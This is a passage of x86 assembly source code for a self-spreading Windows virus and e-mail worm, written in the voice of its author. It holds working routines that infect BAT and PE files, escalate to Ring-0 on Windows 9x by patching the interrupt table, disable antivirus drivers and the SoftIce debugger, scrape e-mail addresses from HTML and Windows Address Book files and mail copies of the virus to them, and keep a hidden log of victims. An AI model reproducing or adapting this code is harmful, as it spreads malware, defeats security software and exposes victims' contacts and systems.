   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % BAT Infection (see Win32.Rhapsody)                                      %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; This routine will infect the given BAT file. If you want to know how the
   ; fuck it works, just take a look to my Win32.Rhapsody. This is the enhaced
   ; version of that code, much more readable. The infected BAT files run slow
   ; as the fucking hell... they're about 100K :)

   InfectBAT:

           lea     eax,[ebp+ExitInfectArchive]     ; For correct w0rk :)
           push    eax

   ; We don't want to infect too suspicious files (ie AUTOEXEC.BAT)

   BAT_switch:
           db      90h

           xor     esi,esi
           push    esi
           push    esi
           push    esi
           push    04h                             ; map attibutes
           push    esi
           push    dword ptr [ebp+FileHandle]      ; push handle
           apicall CreateFileMappingA
           push    eax

           push    esi
           push    esi
           push    esi
           push    02h
           push    eax
           apicall MapViewOfFile
           push    eax

           mov     edi,dword ptr [eax]

           apicall UnmapViewOfFile
           apicall CloseHandle

           cmp     edi,12345678h                   ; Check if it was already
           org     $-4                             ; infected ;P
           db      ":P",13,10
           jnz     ReallyInfectBAT

           ret

   ReallyInfectBAT:
           push    00h
           push    dword ptr [ebp+FileHandle]
           apicall GetFileSize
           mov     dword ptr [ebp+FS_BAT],eax

           push    eax

           push    eax
           push    00h
           apicall GlobalAlloc
           mov     dword ptr [ebp+GA_BAT],eax

           xor     ebx,ebx                         ; EBX = 0
           push    ebx
           push    eax                             ; push size
           push    ebx
           push    04h
           push    ebx
           push    dword ptr [ebp+FileHandle]      ; push handle
           apicall CreateFileMappingA

           pop     ecx                             ; ECX = Size to map

           add     ecx,dword ptr [ebp+DropperSize]
           shl     ecx,2                           ; *4 (it's enough)

           or      eax,eax
           jz      ExitInfectArchive

           mov     dword ptr [ebp+MH_BAT],eax

           xor     ebx,ebx
       push    ecx
           push    ebx
           push    ebx
           push    02h
           push    eax
           apicall MapViewOfFile

           or      eax,eax
           jz      CloseMapOfBAT

           mov     dword ptr [ebp+MA_BAT],eax

           pushad
           xchg    esi,eax                         ; Save old contents of the
           mov     edi,dword ptr [ebp+GA_BAT]      ; BAT file to the allocated
           mov     ecx,dword ptr [ebp+FS_BAT]      ; memory :)
           rep     movsb
           popad

           lea     esi,[ebp+BAT_part1]             ; Put the first part of new BAT
           xchg    edi,eax
           push    sBAT_part1
           pop     ecx
           rep     movsb

           mov     esi,dword ptr [ebp+GlobalAllocHnd2]
           mov     ecx,dword ptr [ebp+DropperSize]
           shr     ecx,04h                         ; /10

           pushad
           shl     ecx,04h                         ; Round up it :)
           xchg    ecx,eax
           lea     edi,[ebp+src_bytes]
           call    HexWrite16
           popad

           xor     edx,edx
           inc     dh                              ; EDX = 100h

   ; Here we construct the debug script code

   sixteen_bytes_written_loop:
           push    ecx
           mov     ax," E"                         ; Write E
           stosw
           mov     eax,edx                         ; E xxxx
           call    HexWrite16

           push    10h
           pop     ecx
   write_row:
           mov     al," "                          ; Write space
           stosb

           lodsb
           call    HexWrite8

           loop    write_row

           mov     ax,0A0Dh                        ; Write CR/LF
           stosw

           add     edx,10h                         ; Gimme mo' :)
           pop     ecx
           loop    sixteen_bytes_written_loop

           lea     esi,[ebp+BAT_part2]             ; Write the second part of the
           push    sBAT_part2                      ; new BAT code
           pop     ecx
           rep     movsb

           mov     esi,dword ptr [ebp+GA_BAT]      ; Write original BAT file
           mov     ecx,12345678h
   FS_BAT  =       $-4
           rep     movsb

           xchg    edx,edi
           sub     edx,dword ptr [ebp+MA_BAT]

           pushad

           push    dword ptr [ebp+MA_BAT]          ; Unmap BAT file
           apicall UnmapViewOfFile

           push    dword ptr [ebp+MH_BAT]          ; Close mapping handle
           apicall CloseHandle

           popad
                                                   ; Truncate BAT file
           push    00h
           push    00h
           push    edx
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    dword ptr [ebp+FileHandle]
           apicall SetEndOfFile

           push    dword ptr [ebp+GA_BAT]          ; Free used temporal memory
           apicall GlobalFree
           ret

   UnmapBAT&Trunc:
           call    UnmapBAT
           push    00h
           push    00h
           push    dword ptr [ebp+FS_BAT]
           push    dword ptr [ebp+FileHandle]
           apicall SetFilePointer

           push    dword ptr [ebp+FileHandle]
           apicall SetEndOfFile
           ret

   UnmapBAT:
           push    12345678h                       ; For emergency only ;)
   MA_BAT  =       $-4
           apicall UnmapViewOfFile

   CloseMapOfBAT:
           push    12345678h
   MH_BAT  =       $-4
           apicall CloseHandle

           push    12345678h
   GA_BAT  =       $-4
           apicall GlobalFree
           ret

           db      066h

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Get Ring-0 priviledge by modifying in the IDT the INT 3 descriptor      %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   w9x_specific:
           push    edx                             ; Well, this code hasn't
           sidt    fword ptr [esp-2]               ; anything special :)
           pop     edx

           add     edx,(interrupt*8)+4

           mov     ebx,dword ptr [edx]
           mov     bx,word ptr [edx-4]

           lea     edi,[ebp+InterruptHandler]

           mov     word ptr [edx-4],di
           shr     edi,10h
           mov     word ptr [edx+2],di

           int     interrupt

           mov     word ptr [edx-4],bx
           shr     ebx,10h
           mov     word ptr [edx+2],bx
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Win9x Ring-0 code                                                       %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; Here we:
   ;       - Clear hardware breakpoints (DR? registers)
   ;       - Disable in memory some VXD av (AVPGUARD, AVP95, SPIDER, GK95)
   ;       - Disable interrupts used by SoftIce

   InterruptHandler:
           pushad

           if      debug
           nop
           else

           xor     eax,eax
           mov     dr0,eax                         ; We don't like breakpoints,
           mov     dr1,eax                         ; do we? ;)
           mov     dr2,eax
           mov     dr3,eax

           call    killavxd
           call    FuckSoftIce

           endif

           popad
           iretd

   ; This code was taken from the awesome Win98.Z0MBiE-8, by Z0MBiE

   killavxd:
           pushad
   @@fx1:  VxDCall VXDLDR_GetDeviceList

   __kavxd_scanvxd:
           mov     ebx,[eax+5]

           cmp     ebx,0C0000000h
           jb      __kavxd_continue

           lea     ecx,[ebx+0Ch]                   ; Name_0

           mov     edx,[ecx]
           neg     edx

           mov     cl,1
           cmp     edx,-'DIPS'                     ; SPIDER
           jz      __kavxd_patch

           mov     cl,2
           cmp     edx,-'9PVA'                     ; AVP95
           jz      __kavxd_patch

           mov     cl,4
           cmp     edx,-'GPVA'                     ; AVPGUARD
           jz      __kavxd_patch

           mov     cl,8
           cmp     edx,-'59KG'                     ; GK95
           jz      __kavxd_patch

   __kavxd_continue:
           mov     eax,[eax]
           or      eax,eax
           jnz     __kavxd_scanvxd
           popad
           ret

   __kavxd_patch:
           pushad

           call    GetDeltaOffset
           db      0FFh
           lea     ebp,[ebp+kavxd_kill_moveax]

           mov     esi,0000D500h                   ; R0_OPENCREATFILE
           call    __kavxd_fuck
           mov     esi,0000D501h                   ; R0_OPENCREAT_IN_CONTEXT
           call    __kavxd_fuck

           cmp     cl,4                            ;  avpguard
           jne     __skip1

           call    GetDeltaOffset
           db      067h
           lea     ebp,[ebp+kavxd_kill_cd20]

           mov     esi,002A001Ah                   ; VWIN32_SysErrorBox
           call    __kavxd_fuck
           mov     esi,002A000Eh                   ; VWIN32_SetWin32Event
           call    __kavxd_fuck


           call    GetDeltaOffset
           db      0BBh
           lea     ebp,[ebp+kavxd_kill_badcall]

           mov     eax,002Ah                       ; VMM
           xor     edi,edi
   @@fx2:  VxDCall VMM_Get_DDB
           mov     edx,[ecx+30h]                   ; DDB_Service_Table_Ptr

           lea     esi,[edx+4*001Ah]               ; VWIN32_SysErrorBox
           call    __kavxd_fuck
           lea     esi,[edx+4*000Eh]               ; VWIN32_SetWin32Event
           call    __kavxd_fuck

   __skip1:
           popad
           jmp     __kavxd_continue

   __kavxd_fuck:
           pushad

           mov     edi,[ebx+18h]                   ; Control_Proc_0

   __kavxd_1:
           lea     ecx,[edi+4]                     ; check presence for
           test    ecx,00000FFFh                   ; each new page encountered
           jnz     __kavxd_2

           pushad
           sub     esp,28
           mov     esi,esp

           push    28
           push    esi                             ; esi = MEMORY_BASIC_INFO
           push    ecx
   @@fx3:  VxDCall VMM_PageQuery

           test    dword ptr [esi+10h],1000h       ; mbi_state & MEM_COMMIT

           lea     esp,[esp+4*3+28]                ; Fix ESP

           popad
           jnz     __kavxd_2

           popad
           ret

   __kavxd_2:
           inc     edi

           cmp     [edi],esi                       ; <esi>
           jne     __kavxd_1

           call    ebp

           jmp     __kavxd_1

   kavxd_kill_moveax:
           cmp     byte ptr [edi-1],0B8h
           jne     rt
           mov     dword ptr [edi],-1              ; R0_xxx <-- 0xFFFFFFFF
           ret

   kavxd_kill_cd20:
           cmp     word ptr [edi-2],20CDh
           jne     rt
   kavxd_kill_both:
           mov     word ptr [edi-2],0B890h         ; nop/mov eax, 1
           mov     dword ptr [edi],1
           ret

   kavxd_kill_badcall:
           cmp     word ptr [edi-2],15FFh
           je      kavxd_kill_both
   rt:
           ret

   ; This routine was taken from Win9x.Dammit, by Ultras/[MATRiX] - hiya :)

   FuckSoftIce:
           pushad

           push    ebx
           sidt    [esp-2]
           pop     ebx

           mov     eax,[ebx+01h*8+6-2]             ; int 01h
           mov     ax,[ebx+01h*8+0]
           call    fuckint

           mov     eax,[ebx+03h*8+6-2]             ; int 03h
           mov     ax,[ebx+03h*8+0]
           call    fuckint

           popad
           ret

   fuckint:
           cmp     byte ptr [eax],68h              ; SoftIce signature
           jne     __skipfuck
           cmp     byte ptr [eax+5],0E9h           ; SoftIce signature
           jne     __skipfuck
           mov     byte ptr [eax],0CFh             ; iret
   __skipfuck:
           ret


   ; This procedure will fix all the VxDCalls, no more worries about that
   ; This one is *really* mine :)

   VxDFix          proc
   ; input:
   ;       Nothing.
   ; output:
   ;       Nothing.

           lea     esi,[ebp+VxD_fix]               ; Point to that structure
           push    n_VxD_fix                       ; ECX = Number of VxDCalls
           pop     ecx                             ;       that we have to patch
           mov     edx,20CDh                       ; EDX = INT 20h :)
   LoopOfFixAllVxDCalls:
           lodsd                                   ; Load offset where patch
           add     eax,ebp                         ; Fix with delta
           mov     edi,edx                         ; Prepare to put the INT 20h
           xchg    eax,edi                         ; Things put in the rite place
           stosw                                   ; Store the INT 20h
           movsd                                   ; Put then the service there
           loop    LoopOfFixAllVxDCalls            ; Easy, optimized and effective
           ret
   VxDFix          endp

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Infection routines                                                      %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   InfectionCheck  proc
   ; input:
   ;       ESI = Pointer to PE header
   ; output:
   ;       CF  = Set if error

           cmp     byte ptr [ebp+SoftICE],NoSoftICE ; If SiCE, no infect
           jnz     ErrorInfectionCheck

           cmp     word ptr [esi],"EP"             ; Check for PE mark
           jnz     ErrorInfectionCheck

           cmp     dword ptr [esi.MagicInfection],inf_mark
           jz      ErrorInfectionCheck             ; Check for previous infection

           cmp     word ptr [esi.Machine],i386_machine
           jnz     ErrorInfectionCheck             ; Check for i386 ;)

           bt      word ptr [esi.PECharacteristics],0Dh
           jc      ErrorInfectionCheck             ; Check for DLL bit

           cmp     dword ptr [ebp.WFD_nFileSizeHigh],00h
           jnz     ErrorInfectionCheck             ; Don't allow huge & ugly files

           if      debug
           else
           cmp     dword ptr [ebp.WFD_nFileSizeLow],2000h ; 8k
           jb      ErrorInfectionCheck             ; Don't allow too little files
           endif

           mov     dword ptr [esi.MagicInfection],inf_mark
                                                   ; Mark header as infected
           test    al,00h
           org     $-1
   ErrorInfectionCheck:
           stc
           ret
   InfectionCheck  endp

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   PreInfection    proc
   ; input:
   ;       ESI = Pointer to PE header
   ; output:
   ;       EDI = Pointer to PE header
   ;       ESI = Pointer to last section header

       mov     edi,esi

           movzx   eax,word ptr [edi.NumberOfSections]
       dec     eax
           imul    eax,eax,SizeOfSectHeader
       add     esi,eax
       add     esi,78h
           mov     edx,[edi.74h]
       shl     edx,03h
           add     esi,edx

           and     dword ptr [edi.DirEntryReloc],00h ; Nulify relocations ;)
           and     dword ptr [edi.DirEntryReloc.4],00h
           or      dword ptr [esi.Characteristics],RWX_attributes
           ret
   PreInfection    endp

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ProcessExtension proc
   ; input:
   ;       EBX = Pointer to file name (only)
   ;       EDI = Pointer to file name (with full path)
   ; output:
   ;       ECX = 00 - Error: not handled extension
   ;             01 - Possible PE file
   ;             02 - Possible known archive
   ;             03 - Possible HTMx file (needed for e-mail spreading)
   ;             04 - Possible WAB file (needed for e-mail spreading)

           xor     ecx,ecx
           call    AvoidShitFiles
           jc      NotHandledExtension

           mov     al,"."                          ; Search for da point
           scasb
           jnz     $-1

           dec     edi

           mov     eax,[edi]                       ; Get the extension
           or      eax,20202020h                   ; Make it lowercase

           mov     dword ptr [ebp+extension],eax   ; Save here also
           xchg    eax,ebx

   ; extension_table format:
   ;       BYTE    type_of_file
   ;       DWORD   extension

           lea     esi,[ebp+extension_table]
   lewp:   lodsb
           xor     ecx,ecx
           cmp     al,0BBh
           jz      NotHandledExtension
           mov     cl,al                           ; ECX = Action to do
           lodsd
           cmp     eax,ebx
           jnz     lewp
   NotHandledExtension:
           ret
   ProcessExtension endp

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   AvoidShitFiles  proc
   ; input:
   ;       EDI = Pointer to filename
   ; output:
   ;       CF = Set if shitty file

           pushad
           mov     edi,ebx
           mov     esi,edi
           call    ToUpperCase
           lea     esi,[ebp+Files2Avoid]           ; Ptr to table
   ASF_Loop:
       xor     eax,eax                         ; Clear EAX
       lodsb                                   ; Load size of string in AL

       cmp     al,0BBh                         ; End of table?
       jz      AllShitFilesProcessed           ; Oh, shit!

       xchg    eax,ecx                         ; Put Size in ECX
       push    edi                             ; Preserve program pointer
       rep     cmpsb                           ; Compare both strings
       pop     edi                             ; Restore program pointer
       jz      ShitFileFound                   ; Damn, a shitty file!

       add     esi,ecx                         ; Pointer to another string
       jmp     ASF_Loop                        ; in table & loop

   AllShitFilesProcessed:
           test    al,00h                          ; Overlap
       org     $-1
   ShitFileFound:
       stc                                     ; Set carry
           popad
       ret
   AvoidShitFiles  endp

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % APICRC32 engine                                                         %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; The pseudo-structure for the APICRC32 engine is the following:
   ;
   ;       * ASCIIz String of the library (not needed for KERNEL32)
   ;       * CRC32 of APIs we need
   ;       * BB byte (for signalize the end of exports needed of that function)
   ;       * ... (repeat the above points the times you need->libraries u use)
   ;       * "" byte (for signalize the definitive end of imports)

   GetAPIs         proc
   ; input:
   ;       EAX = Base address of the library where search the APIs
   ;       ESI = Pointer to an array of CRC32 of the APIs we want to search
   ;       EDI = Pointer to where store the APIs
   ; output:
   ;       Nothing.

       push    eax                             ; EAX = Handle of module
           pop     dword ptr [ebp+TmpModuleBase]
   APIS33K:
       lodsd                                   ; Get in EAX the CRC32 of API
           push    esi edi
       call    GetAPI_ET_CRC32
           pop     edi esi
       stosd                                   ; Save in [EDI] the API address

           cmp     byte ptr [esi],0BBh             ; There are more APIs in this
           jnz     APIS33K                         ; library

           inc     esi                             ; Check if it's the last of
           cmp     byte ptr [esi],""              ; all them
           jz      EndOfAPISearch

           push    esi                             ; ESI points now to the ASCIIz
           apicall LoadLibraryA                    ; string of a library... We
                                                   ; need to load it!
           push    eax

   nxtchr: lodsb                                   ; Reach the end of the lib
           test    al,al                           ; asciiz name
           jnz     nxtchr

           pop     eax
           jmp     GetAPIs

   EndOfAPISearch:
           ret
   GetAPIs         endp

   GetAPI_ET_CRC32 proc
   ; input:
   ;       EAX = CRC32 of the API we want to know its address
   ; output:
   ;       EAX = API address, NULL if error

       xor     edx,edx

           pushad

           call    over_APICRC32_SEH
           mov     esp,[esp+08h]                   ; Set stack as before
           xor     eax,eax                         ; signalize the error
           jmp     Remove_APICRC32_SEH

   over_APICRC32_SEH:
           push    dword ptr fs:[edx]              ; Set new SEH frame
           mov     dword ptr fs:[edx],esp

       xchg    eax,edx                         ; Put CRC32 of da api in EDX
           mov     dword ptr [ebp+Counter],eax     ; Clear this field :)
           push    3Ch
           pop     esi
           add     esi,[ebp+TmpModuleBase]         ; Get PE header of module
       lodsw
           add     eax,[ebp+TmpModuleBase]         ; Normalize

           push    1Ch
           pop     esi
           add     esi,[eax+78h]                   ; Get a pointer to its edata
           add     esi,[ebp+TmpModuleBase]

           lea     edi,[ebp+AddressTableVA]        ; Pointer to the address table
       lodsd                                   ; Get AddressTable value
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       stosd                                   ; And store in its variable

       lodsd                                   ; Get NameTable value
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       push    eax                             ; Put it in stack
       stosd                                   ; Store in its variable

       lodsd                                   ; Get OrdinalTable value
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       stosd                                   ; Store

       pop     esi                             ; ESI = NameTable VA

   @?_3:   lodsd                                   ; Get pointer to an API name
           push    esi                             ; Save again
           add     eax,[ebp+TmpModuleBase]         ; Normalize
       xchg    edi,eax                         ; Store ptr in EDI
       mov     ebx,edi                         ; And in EBX

       push    edi                             ; Save EDI
           xor     al,al
           scasb
           jnz     $-1
       pop     esi                             ; ESI = Pointer to API Name

       sub     edi,ebx                         ; EDI = API Name size

       push    edx                             ; Save API's CRC32
       call    CRC32                           ; Get actual api's CRC32
       pop     edx                             ; Restore API's CRC32
       cmp     edx,eax                         ; Are them equal?
       jz      @?_4                            ; if yes, we got it

       pop     esi                             ; Restore ptr to api name
           inc     dword ptr [ebp+Counter]         ; And increase the counter
       jmp     @?_3                            ; Get another api!
   @?_4:
       pop     esi                             ; Remove shit from stack
           mov     eax,12345678h                   ; Put in EAX the number that
   Counter =       $-4                             ; the API occupy in list.
       shl     eax,1                           ; *2 (it's an array of words)
           add     eax,[ebp+OrdinalTableVA]        ; Normalize
       xchg    eax,esi                         ; ESI = Ptr 2 ordinal; EAX = 0
       lodsw                                   ; Get ordinal in AX
       cwde                                    ; Clear MSW of EAX
       shl     eax,2                           ; And with it we go to the
           add     eax,[ebp+AddressTableVA]        ; AddressTable (array of
       xchg    esi,eax                         ; dwords)
       lodsd                                   ; Get Address of API RVA
           add     eax,[ebp+TmpModuleBase]         ; and normalize!! That's it!

   Remove_APICRC32_SEH:
           xor     edx,edx                         ; Remove that SEH frame
           pop     dword ptr fs:[edx]
           pop     edx
           mov     [esp.PUSHAD_EAX],eax
           popad
       ret
   GetAPI_ET_CRC32 endp

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % E-MAIL Spreading Subroutines (i-worm)                                   %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; This function will search into the HTML filez for e-mail addresses, and
   ; each time it finds anyone, it will try to send a copy of the virus there
   ; (if that e-mail wasn't already used).

   AnalyzeHTM:
   ; input:
   ;       EDI = HTM(L) file to analyze
   ; output:
   ;       Nothing.

   switch: nop                                     ; X-D

           push    80h                             ; Destroy hostile attributes
           push    edi                             ; (again) :)
           apicall SetFileAttributesA

           xor     eax,eax                         ; Open file for R/W
       push    eax
       push    eax
           push    03h
       push    eax
       inc     eax
       push    eax
           push    0C0000000h
           push    edi
           apicall CreateFileA

           inc     eax
           jz      ExitProcessingHTM
           dec     eax

           mov     dword ptr [ebp+FH_HTM],eax      ; Save handle of opened file

           push    eax

           push    00h
           push    eax
           apicall GetFileSize                     ; Get its size
           mov     dword ptr [ebp+SizeOfHTM],eax

           pop     ecx

           cdq                                     ; An HTM file won't be much
                                                   ; bigger that 2 Gigs, ok? :)
           push    edx
           push    edx
           push    edx
           push    04h                             ; map attibutes
           push    edx
           push    ecx                             ; push handle
           apicall CreateFileMappingA

           or      eax,eax
           jz      CloseFileExitProcessingHTM

           mov     dword ptr [ebp+MH_HTM],eax

           xor     ebx,ebx                         ; Map the entire file :)
           push    ebx
           push    ebx
           push    ebx
           push    02h
           push    eax
           apicall MapViewOfFile

           or      eax,eax
           jz      CloseMap&FileExitProcessingHTM

           mov     dword ptr [ebp+MA_HTM],eax

   ; Here, our friend is mapped :)

           mov     ecx,12345678h
   SizeOfHTM =     $-4
           xchg    eax,esi

   tihs:   lea     edi,[ebp+emilio]                ; For whom the bell tolls?
           push    edi                             ; OHHHH YEAH! METALLICA RULEZ!
           call    GetMailAddressFromHTML          ; Ride The Lightning, babe.
           pop     edi
           jc      liberate ;my madness

   ; Okay, we've got an e-mail address... let's try to send sumthing there X-D

           pushad
           mov     esi,edi
           call    CheckEmail                      ; Check if we've already sent
           jc      TheDorkWasAlreadyInfected       ; shit to the d0rk

           lea     esi,[ebp+emilio]
           call    AddToMailTable                  ; Add the mail to our 'special'
                                                   ; address book :)

           if      debug                           ; The debug action :)
           push    0
           pushs   "E-Mail found!!!"
           lea     eax,[ebp+emilio]
           push    eax
           push    0
           apicall MessageBoxA_
           endif

           call    SendMail

   TheDorkWasAlreadyInfected:
           popad
           jmp     tihs

   liberate:
   UnMap&CloseMap&FileExitProcessingHTM:
           push    12345678h
   MA_HTM  =       $-4
           apicall UnmapViewOfFile

   CloseMap&FileExitProcessingHTM:
           push    12345678h
   MH_HTM  =       $-4
           apicall CloseHandle

   CloseFileExitProcessingHTM:
           push    12345678h
   FH_HTM  =       $-4
           apicall CloseHandle

   ExitProcessingHTM:
           ret

   ; This function, done by LifeWire/iKX (hiya pal!), will search into every
   ; Windows Address Book (WAB) file for e-mail addresses. It'll make the virus
   ; spread a'la Melissa, but with neat and low-level code. Idea & code: LW/iKX.

   AnalyzeWAB:
   ; input:
   ;       EDI = WAB file to analyze
   ; output:
   ;       Nothing.

   switch2:nop
           xor     esi,esi                         ; Open file for R/W
           push    esi
           push    esi
           push    03h
           push    esi
           push    01h
           push    0C0000000h
           push    edi
           apicall CreateFileA

           inc     eax
           jz      ExitProcessingWAB
           dec     eax

           mov     dword ptr [ebp+FH_WAB],eax      ; Save handle of opened file

           push    esi
           push    esi
           push    esi
           push    04h                             ; map attibutes
           push    esi
           push    eax                             ; push handle
           apicall CreateFileMappingA

           or      eax,eax
           jz      CloseFileExitProcessingWAB

           mov     dword ptr [ebp+MH_WAB],eax

           push    esi
           push    esi
           push    esi
           push    02h
           push    eax
           apicall MapViewOfFile

           or      eax,eax
           jz      CloseMap&FileExitProcessingWAB

           mov     dword ptr [ebp+MA_WAB],eax

   ; Now we have the whole WAB file mapped in memory. Let's get addresses from
   ; it! :P

           mov     ecx,dword ptr [eax+64h]         ; Number of addresses
           jecxz   UnMap&CloseMap&FileExitProcessingWAB
           add     eax,dword ptr [eax+60h]         ; Pointer in mem to them

   lifewire_g0d:
           pushad
           mov     esi,eax

           cmp     byte ptr [esi+1],00h            ; Outlook 5.5? The dammit has
           jnz     do_it_as_always                 ; e-mails in unicode.

           lea     edi,[ebp+normal_mail]
           push    edi
   uni2asciiz:
           movsb                                   ; Convert UNI to ASCIIz
           dec     edi
           cmpsb
           jnz     uni2asciiz
           pop     esi
           add     dword ptr [esp.PUSHAD_EAX],24h  ; We must add 48h (24h twice)
   do_it_as_always:
           push    esi
           call    CheckEmail                      ; Was the address there?
           pop     esi                             ; Check it sucka!
           jc      TheD0rkWasAlreadyInfected

           if      debug                           ; The debug action :)
           push    0
           pushs   "E-Mail found!!!"
           push    esi
           push    0
           apicall MessageBoxA_
           endif

           push    esi
           call    AddToMailTable                  ; Add the mail to our 'special'
           pop     esi                             ; address book :)

           lea     edi,[ebp+emilio]                ; Put the address here
   else¤ordelosgramillos:
           lodsb
           stosb
           test    al,al
           jnz     else¤ordelosgramillos           ; M„go de Oz rulez! :)

           call    SendMail                        ; Send it! ;)

   TheD0rkWasAlreadyInfected:
           popad
           add     eax,24h
           loop    lifewire_g0d

   UnMap&CloseMap&FileExitProcessingWAB:
           push    12345678h
   MA_WAB  =       $-4
           apicall UnmapViewOfFile

   CloseMap&FileExitProcessingWAB:
           push    12345678h
   MH_WAB  =       $-4
           apicall CloseHandle

   CloseFileExitProcessingWAB:
           push    12345678h
   FH_WAB  =       $-4
           apicall CloseHandle

   ExitProcessingWAB:
           ret

   ; Some routines used in both methods :)

   AddToMailTable:
   ; input:
   ;       ESI = Pointer to e-mail address
   ; output:
   ;       Nothing.

           call    GetCRC32
           mov     dword ptr [ebp+EmailCRC],eax

           lea     edi,[ebp+AddBook]
           push    80h
           push    edi
           apicall SetFileAttributesA

           push    00h                             ; Open the address book
           push    80h
           push    04h                             ; Open if exist, create if don't
           push    00h
           push    01h
           push    0C0000000h
           call    _over
   AddBook:db      "C:\REVEROF.SYS",0
   _over:  apicall CreateFileA
           push    eax

           push    02h                             ; Put the pointer at the end
           push    00h                             ; of the file
       push    00h
           push    eax
           apicall SetFilePointer

           mov     eax,[esp]

           push    00h                             ; Write the CRC32 of the
           lea     ebx,[ebp+iobytes]               ; e-mail to the file (this
           push    ebx                             ; avoids us to re-send the
           push    04h                             ; virus to an already infected
           call    _0ver                           ; victim) that is used as add.
   EmailCRC dd     ?                               ; book :)
   _0ver:  push    eax
           apicall WriteFile
           apicall CloseHandle

           lea     edi,[ebp+AddBook]
           push    80h or 04h or 02h or 01h        ; Untouchable file
           push    edi
           apicall SetFileAttributesA
           ret

   CheckEmail:
   ; input:
   ;       ESI = Pointer to e-mail address
   ; output:
   ;       CF = Set if e-mail used or address book don't exist, 0 if not.

           call    GetCRC32
           mov     dword ptr [ebp+email],eax

           lea     edi,[ebp+AddBook]
           push    80h
           push    edi
           apicall SetFileAttributesA

           push    00h                             ; Open the address book
           push    80h
           push    04h
           push    00h
           push    01h
           push    0C0000000h
           lea     eax,[ebp+AddBook]
           push    eax
           apicall CreateFileA

           inc     eax
           jz      CE_err                          ; If file doesn't exist, error
           dec     eax

           push    eax

           mov     edi,eax

           push    00h
           push    eax
           apicall GetFileSize

           mov     ebx,eax
           shr     ebx,2                           ; EBX = Number of recorded
                                                   ;       e-mails in the file
           mov     dword ptr [ebp+nEmails],ebx

           mov     esi,eax

           push    eax
           push    00h
           apicall GlobalAlloc
           mov     dword ptr [ebp+AddressTblMem],eax

           mov     ecx,[esp]

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
           push    esi                             ; Size to read
           push    eax                             ; Where read it
           push    edi                             ; Handle of file :)
           apicall ReadFile

           apicall CloseHandle

           lea     edi,[ebp+AddBook]
           push    80h or 04h or 02h or 01h        ; Untouchable file
           push    edi
           apicall SetFileAttributesA

           mov     eax,12345678h                   ; Here goes E-MAIL CRC32
   email   =       $-4
           mov     edi,12345678h                   ; Here goes where are all
   AddressTblMem = $-4                             ; addresses stored
           mov     ecx,12345678h                   ; This is the number of emails
   nEmails =       $-4                             ; stored
           jecxz   CE_ok                           ; bugfix :)
           repnz   scasd                           ; Is this mail here?

           pushfd                                  ; Close temporal memory
           push    dword ptr [ebp+AddressTblMem]   ; in any case X-D
           apicall GlobalFree
           popfd

           jz      CE_err                          ; The solution is here :P

   CE_ok:  test    al,00h
           org     $-1
   CE_err: stc
           ret


   GetMailAddressFromHTML:
   ; input:
   ;       ECX = Size of code to search
   ;       ESI = Pointer to HTML code
   ;       EDI = Pointer to where store e-mail (if found)
   ; output:
   ;       CF = Set if no e-mails found

   seekit: cmp     dword ptr [esi],'iam"'          ; Search for '"mailto:' string
           jnz     ckuf                            ; Maybe we got it...
           cmp     dword ptr [esi+4],":otl"
           jz      liberty
   ckuf:   inc     esi                             ; Or not :(
   skream: loop    seekit                          ; Loop till the limit
           stc                                     ; Signalize the error
           ret
   liberty:lea     esi,[esi+8]                     ; ESI points to the email
   cpmail: lodsb                                   ; Put it in the variable :)
           stosb
           cmp     al,'"'                          ; email is till '"'
           jnz     cpmail
           mov     byte ptr [edi-1],00h            ; Make null the last '"'
           clc                                     ; Away without error...
